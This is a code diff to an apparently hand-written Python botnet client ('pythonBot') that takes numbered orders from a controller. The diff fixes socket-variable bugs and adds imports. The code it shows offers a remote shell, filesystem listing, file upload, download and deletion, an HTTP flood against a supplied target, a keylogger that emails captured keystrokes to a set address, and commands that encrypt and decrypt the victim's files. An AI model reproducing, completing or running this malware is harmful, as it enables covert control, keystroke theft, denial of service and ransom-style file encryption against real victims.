@@ -14,15 +14,29 @@ import smtplib
 import time
 import random
 
+from email import encoders
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
 from sys import platform
 from cryptography.fernet import Fernet
+from pynput.keyboard import Key, Listener
 
 addr = 'ADDRESS'
 port = 5555
 encrKey = "dssMKeQcclJGWbClsNSGN7hiPm7UMqR7CHi7SrKZz8w="
 
-# options: shell(*), listfs(*), upload(*), download, encr, ddos, ping(*), remove, screenshot, screencast(ffmpeg), keylogger, file-encrypter, tcp-proxy
+# options: shell(*), listfs(*), upload(*), download, encr(*), ddos(*), ping(*), remove, screenshot, screencast(ffmpeg), keylogger(*), file-encrypter(*), tcp-proxy
 #          ssh, 
+
+def execute(cmd):
+    cmd = cmd.strip()
+    if not cmd:
+        return
+    output = subprocess.check_output(shlex.split(cmd),
+                                     stderr=subprocess.STDOUT)
+    return output.decode()
+
 
 class botOptions:
     shell = '303'
@@ -36,15 +50,6 @@ class botOptions:
     keylogger = '666'
     encrypter = '999'
     decrypter = '989'
-    
-def execute(cmd):
-    cmd = cmd.strip()
-    if not cmd:
-        return
-    output = subprocess.check_output(shlex.split(cmd),
-                                     stderr=subprocess.STDOUT)
-    return output.decode()
-
 
 class pythonBot:
     
@@ -132,8 +137,7 @@ class pythonBot:
         elif pynputOK == 'output':
             pynputOK = f'[WW] pip output on bot [{self.addr}::{self.port}]: {output}'
         else:
-            pynputOK = f'[EE] failed to load pynput module on bot [{self.addr}::{self.port}]'
-        
+            pynputOK = f'[EE] failed to load pynput module on bot [{self.addr}::{self.port}]'   
         if cryptographyOK:
             cryptographyOK = f'[**] cryptography module installed on bot [{self.addr}::{self.port}]'
         elif cryptographyOK == 'pip':
@@ -168,6 +172,7 @@ class pythonBot:
             except Exception as e:
                 print('[EE]', e)
                 break
+
             if req == botOptions.shell:
                 cmd_buffer = b''
                 user = getpass.getuser()
@@ -200,21 +205,20 @@ class pythonBot:
                     except Exception as e:
                         error = f'[EE] bot [{self.addr}::{self.port}] recieved error: {e}'
                         client_socket.send(error.encode())
+
             elif req == botOptions.listfs:
                 print("[**] recieved ls-fs order")
                 main_path = ''
                 grep = ''
                 listfs = ''
                 sy = ''
-                path = os.getcwd()
-                
+                path = os.getcwd()           
                 if os.name == 'nt':
                     main_path = "C:\\"
                     sy = '\\'
                 else:
                     main_path = '/'
-                    sy = '/'                    
-                    
+                    sy = '/'                                   
                 for dirpath, dirnames, files in os.walk(main_path, topdown=False):
                     listfs = listfs + (f' Directory: {dirpath} \r\n')
                     grep = grep + (f'Directory: {dirpath} \r\n')
@@ -227,8 +231,7 @@ class pythonBot:
                     
             elif req == botOptions.download_file:
                 file = self.recv_encr(4096, client_socket)
-                file_buffer = ''
-                
+                file_buffer = ''        
                 try:
                     while True:
                         data = client_socket.recv(4096)
@@ -237,7 +240,7 @@ class pythonBot:
                                 data = decr_data(data)
                                 data = data.decode()
                             else:
-                                client_sock.send(file.encode())
+                                client_socket.send(file.encode())
                                 data = data.decode()                        
                             file_buffer += data
                         else:
@@ -251,8 +254,10 @@ class pythonBot:
                 f.close()
                 st = f'[**] bot [{self.addr}::{self.port} executed file transmission]'
                 self.send_encr(st, client_socket)
+
             elif req == botOptions.upload_dir:
                 pass
+
             elif req == botOptions.upload_file:
                 print('[**] upload request recieved')
                 #file = self.recv_encr(1024, client_socket)
@@ -265,11 +270,12 @@ class pythonBot:
                 #self.send_encr(file_buffer, client_socket)
                 print('[**] sending file', file)
                 client_socket.send(file_buffer.encode())
+
             elif req == botOptions.dos:
                 msg = f'[**] bot [{self.addr}::{self.port}] is running DoS.'
                 client_socket.send(msg.encode())
-                target = client_sock.recv(1024)
-                port = client_sock.recv(1024)
+                target = client_socket.recv(1024)
+                port = client_socket.recv(1024)
                 def attack(already_connected, failed_conn):
                     bind = False
                     while True:
@@ -284,12 +290,11 @@ class pythonBot:
                                 except Exception as e:
                                     pass
                             s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-                            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+                            s.sendto(("Host: " + "182.213.12.32" + "\r\n\r\n").encode('ascii'), (target, port))
                             s.close()
                             already_connected += 1
                             con = str(already_connected)
-                            print(" (", con, ") requests sent to target.", end="\r")
-            
+                            print(" (", con, ") requests sent to target.", end="\r")       
                         except KeyboardInterrupt:
                             print(50 * " ")
                             pass
@@ -318,7 +323,8 @@ class pythonBot:
                     else:
                         pass
                     thread = threading.Thread(target=attack(already_con, failed_con))
-                    thread.start()            
+                    thread.start()   
+
             elif req == botOptions.rm:
                 rm = self.recv_encr(1024, client_socket)
                 msg = f'[**] bot [{self.addr}::{self.port}] executed removal of {rm}'
@@ -327,22 +333,24 @@ class pythonBot:
                         os.remove(rm)
                     except OSError:
                         shutil.rmtree(rm)
-                    self.send_encr(msg, client_sock)
+                    self.send_encr(msg, client_socket)
                 else: 
                     error = f'[EE] bot [{self.addr}::{self.port}] recieved error: file or directory does not exist'
                     self.send_encr(error, client_socket)
+
             elif req == botOptions.keylogger:
                 global keys
                 global count
                 global email_char_limit
                 global key_count
                 global char_count
+                global verboseLevel
                 count = 0
                 email_char_limit = 500
                 keys = []
                 key_count = 0
                 char_count = 0
-            
+                verboseLevel = 1
                 def send_mail():
                     if verboseLevel == 1:
                         print('sending email...')
@@ -353,30 +361,22 @@ class pythonBot:
                     server.starttls()
                     server.ehlo()
                     server.login(self.hostEmail, self.hostEmailPassword)
-            
                     msg = MIMEMultipart()
                     msg['From'] = 'Key Logger'
                     msg['To'] = self.targetEmail
-                    msg['Subject'] = 'Key Logger'
-            
-                    message = 'Log-file'
-            
-                    msg.attach(MIMEText(message, 'plain'))
-            
+                    msg['Subject'] = 'Key Logger'      
+                    message = 'Log-file'   
+                    msg.attach(MIMEText(message, 'plain'))           
                     filename = 'log.txt'
-                    attachment = open(filename, 'r')
-            
+                    attachment = open(filename, 'r')           
                     p = MIMEBase('application', 'octet-stream')
-                    p.set_payload(attachment.read())
-            
+                    p.set_payload(attachment.read())           
                     encoders.encode_base64(p)
                     p.add_header('Content-Disposition', f'attachment; filename={filename}')
-                    msg.attach(p)
-            
+                    msg.attach(p)            
                     text = msg.as_string()
                     server.sendmail(self.hostEmail, self.targetEmail, text)
-                    server.quit()
-            
+                    server.quit()     
                 def on_press(key):
                     global keys, count, char_count
                     keys.append(key)
@@ -386,16 +386,13 @@ class pythonBot:
                     else:
                         pass
                     if key != Key.backspace:
-                        char_count += 1
-            
+                        char_count += 1   
                     write_file(keys)
                     keys = []
-            
                     if count == email_char_limit:
                         send_mail()
                         os.remove("log.txt")
-                        count = 0
-            
+                        count = 0    
                 def write_file(keys):
                     global key_count, char_count
                     with open("log.txt", "a") as f:
@@ -411,8 +408,7 @@ class pythonBot:
                                 if char_count > 0:
                                     f.seek(0, 2)
                                     f.seek(f.tell() - 1, 0)
-                                    f.truncate()
-            
+                                    f.truncate()            
                             elif key == Key.space:
                                 f.write(' ')
                             elif k.find("Key") == '#':
@@ -444,25 +440,24 @@ class pythonBot:
                             elif k.find("Key") == '*':
                                 f.write('*')
                             elif k.find("Key") == -1:
-                                f.write(k)
-            
+                                f.write(k)        
                 def on_release():
-                    end = self.recv_encr(1024, client_sock)
+                    end = self.recv_encr(1024, client_socket)
                     if end:
                         return False
                     else:
-                        pass
-            
+                        pass          
                 with Listener(on_press=on_press, on_release=on_release) as listener:
                     listener.join()
                 with Listener(on_press=on_press) as listener:
-                    listener.join()            
+                    listener.join()   
+
             elif req == botOptions.ping:
                 print("[**] recieved ping order")
                 ping = f'[**] bot [{self.addr}::{self.port}] is online. '
                 client_socket.send(ping.encode())
-                print(f'[**] ping order completed')
-            
+                print(f'[**] ping order completed')   
+
             elif req == botOptions.encrypter:
                 print("[**] recieved encryption order")
                 key = self.recv_encr(2048, client_socket)
@@ -490,18 +485,16 @@ class pythonBot:
                             print("[**] writing file")
                             with open (file, 'wb') as f:
                                 f.write(data)
-                            f.close()
-                            
+                            f.close()                          
                             time.sleep(0.3)
                             print("[**] sending OK")
                             self.send_encr("200", client_socket)
                         except Exception as e:
                             print(f"[EE] error: {e}")
                             self.send_encr(e, client_socket)
-                            pass
-                        
+                            pass      
                 self.send_encr(botOptions.encrypter, client_socket)
-                
+
             elif req == botOptions.decrypter:
                 print("[**] recieved decryption order")
                 key = self.recv_encr(2048, client_socket)
@@ -529,18 +522,15 @@ class pythonBot:
                             print("[**] writing file")
                             with open (file, 'wb') as f:
                                 f.write(data)
-                            f.close()
-                            
+                            f.close()                          
                             time.sleep(0.3)
                             print("[**] sending OK")
                             self.send_encr("200", client_socket)
                         except Exception as e:
                             print(f"[EE] error: {e}")
                             self.send_encr(e, client_socket)
-                            pass
-                        
-                self.send_encr(botOptions.decrypter, client_socket)                      
-                 
+                            pass                      
+                self.send_encr(botOptions.decrypter, client_socket)                                     
             else:
                 pass
 
